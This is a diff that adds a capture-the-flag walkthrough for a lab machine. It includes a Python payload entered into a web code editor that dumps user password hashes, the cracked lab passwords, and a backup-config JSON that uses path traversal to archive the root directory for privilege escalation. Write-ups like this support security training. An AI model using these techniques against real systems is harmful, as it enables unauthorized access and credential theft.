@@ -19,3 +19,66 @@
     |_http-server-header: gunicorn/20.0.4
     9898/tcp filtered monkeycom
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+We can see that port 5000 is running a Python Code Editor.
+
+![image](https://github.com/user-attachments/assets/64329268-39d2-469b-9b09-134864bc0cc4)
+
+Use payload:
+
+    print([(user.id, user.username, user.password) for user in User.query.all()])
+
+![image](https://github.com/user-attachments/assets/92fb4455-617b-4f0c-9bd8-e3cdc8c175f1)
+
+Credentials:
+
+    development:759b74ce43947f5f4c91aeddc3e5bad3
+    
+    martin:3de6f30c4a09c27fc71932bfc68474be
+    
+    1:c4ca4238a0b923820dcc509a6f75849b
+
+Passwords
+
+`development`:`development`
+
+`martin`:`nafeelswordsmaster`
+
+## SSH
+
+![image](https://github.com/user-attachments/assets/771c020d-8b06-43f8-bf6d-1efe1893f457)
+
+![image](https://github.com/user-attachments/assets/0f7458be-8b8f-45ca-b973-4fc1bb80bdda)
+
+![image](https://github.com/user-attachments/assets/ffeca174-7211-4583-a115-87c7ffad4a45)
+
+![image](https://github.com/user-attachments/assets/f7bc8ab2-accc-41ea-8cd2-8d7055ef1ad2)
+
+![image](https://github.com/user-attachments/assets/94b628f7-6a92-43b6-b553-4402d6d1c567)
+
+![image](https://github.com/user-attachments/assets/52bc9d84-f57c-4958-a3ab-19840b7022d8)
+
+![image](https://github.com/user-attachments/assets/e037c2e8-6142-43e2-baba-03624b639a41)
+
+![image](https://github.com/user-attachments/assets/d99448ae-4d95-46c1-bdd2-35d05a2221c1)
+
+Get the user flag!
+
+![image](https://github.com/user-attachments/assets/929e6daa-a817-4c99-bba9-8d3634d882ca)
+
+Privilege Escalation
+
+    {
+    “destination”: “/home/martin/”,
+    “multiprocessing”: true,
+    “verbose_log”: true,
+    “directories_to_archive”: [
+    “/var/….//root/”
+    ]
+    }
+
+![image](https://github.com/user-attachments/assets/571a91cb-c7f5-4d21-bbd4-4213ed9a6a69)
+
+Get the root flag!
+
+![image](https://github.com/user-attachments/assets/60a4d038-0792-4447-8de9-d619e4781f23)
